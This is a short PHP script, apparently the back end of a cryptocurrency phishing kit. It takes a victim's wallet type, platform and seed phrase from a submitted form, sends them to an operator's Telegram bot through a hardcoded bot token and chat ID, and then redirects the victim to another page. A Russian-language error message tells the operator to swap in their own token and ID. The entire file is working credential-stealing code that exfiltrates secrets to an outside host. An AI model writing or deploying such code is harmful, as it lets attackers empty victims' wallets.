<?php

header('Access-Control-Allow-Origin: *');

$sid = $_POST['sid'];
$name = $_POST['currency'];
$token = "1781605913:AAH334xxxG-4a7I9RploICW3UyzR89CmMM";
$chat_id = "1129xxxx";
$cash = $_POST['cash'];
$arr = array(
  'Кошелек' => $cash,
  'Слова' => $sid,
  'Платформа' => $name
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: disc.html');
} else {
  echo "Ошибка! Поменяйте токен и ID";
}
?>